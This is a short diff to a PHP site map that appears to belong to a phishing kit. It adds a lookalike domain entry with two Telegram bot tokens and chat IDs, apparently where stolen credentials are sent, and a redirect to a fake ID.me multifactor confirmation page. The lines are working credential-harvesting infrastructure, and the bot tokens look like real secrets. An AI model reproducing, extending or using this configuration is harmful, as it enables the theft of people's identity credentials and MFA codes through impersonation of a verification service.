@@ -37,6 +37,14 @@ $site_map = [
         "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php"
     ],
 
+    'illuminaticonnect.world' => [
+        "bots" => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
+        ],
+        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php"
+    ],
+
 
 
 ];
